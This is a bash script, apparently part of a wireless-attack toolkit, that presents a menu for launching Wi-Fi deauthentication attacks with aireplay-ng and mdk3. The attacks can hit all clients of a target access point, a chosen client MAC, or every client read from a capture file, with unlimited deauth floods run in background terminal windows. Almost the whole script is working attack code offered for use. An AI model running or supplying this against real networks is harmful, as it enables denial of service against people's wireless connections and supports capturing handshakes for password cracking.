#! /bin/bash
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."

####################################
printf '\033]2;DEAUTH MENU\a'
k=1
REDEAUTH="n"
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
####################################
printf '\033]2;DEAUTH MENU\a'
REDEAUTH="n"
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
function option4
{
	rm -f /root/lscript/deauthtemp.txt
	while true
	do
		echo -e "Searching for clients(If it doesnt load in 1 sec, it won't.)"
		dlines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')
		dlines=$((dlines-6))
		clear
		echo -e "Found $dlines clients."
		if [ $dlines -gt 0 ]
		then
			n=0
			while [ $n -lt $dlines ]
			do
			n=$((n+1))
				n1=$((5+n))
				MAC=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
				if [[ $MAC = "" ]]
				then
					echo -e "Empty MAC.Skipping..."
					continue
				fi
				if [ -f /root/lscript/deauthtemp.txt ]
				then
					CHECKMAC=$(cat /root/lscript/deauthtemp.txt | awk -v n2="$MAC" '{if($0 ~ n2)print}')
					if [[ $CHECKMAC != "" ]]
					then
						echo -e "$MAC already being deauthed.Skipping..."
						continue
					fi
				fi
				echo $MAC >> /root/lscript/deauthtemp.txt
				echo -e "Deauthing "$MAC"..."
				export MAC
				xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 0 -a $TARGB -c $MAC $WLANNM; exec bash' & disown
			done
		else
			echo -e "No clients connected..."
		fi
		sleep 5
		clear
		break
		#sleep 5
	done
}
while true
do
	clear
	echo -e ""$YS" 1"$CE") Deauth all                      aireplay-ng"
	echo -e ""$YS" 2"$CE") Deauth all                      mdk3"
	echo -e ""$YS" 3"$CE") Deauth client                   aireplay-ng"
		if [[ $HANDF != 0 || $HANDF != "" ]]
		then
			echo -e ""$YS" 4"$CE") Deauth every client             aireplay-ng"
		fi
	if [[ HANDFORDEAUTH != "" ]]
	then
		echo -e ""$YS"ENTER"$CE") Last option"
	fi
	echo -e ""$YS" 0"$CE") EXIT"
	read DT
	if [[ $DT = 1 ]]
	then
		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
		read -e DEAUTHS
		if [ -z $DEAUTHS ]
		then
			DEAUTHS=0
		fi
		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM"
		export DEAUTHS
		export TARGB
		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
	elif [[ $DT == "" ]]
	then
		if [[ HANDFORDEAUTH != "" ]]
		then
			if [[ LASTOPTIONS != "" ]]
			then
				if [ LASTOPTIONS = 1 ]
				then
					option4
				else
					xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash"
				fi
			fi
		fi
	sleep 2
	elif [[ $DT = 2 ]]
	then
		echo "$TARGB" > /root/mdk3bssid.txt
		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
		export DEAUTHS
		export TARGB
		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
	elif [[ $DT = 3 ]]
	then
		echo -e "Client's MAC: "
		read -e TCC
		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
		read -e DEAUTHS
		clear
		if [ -z $DEAUTHS ]
		then
			DEAUTHS=0
		fi
		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
		export DEAUTHS
		export TARGB
		export TCC
		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
	elif [[ $DT = 4 ]]
	then
		LASTOPTIONS=1
		option4
	elif [[ $DT = 0 ]]
	then
		exit
	fi
done
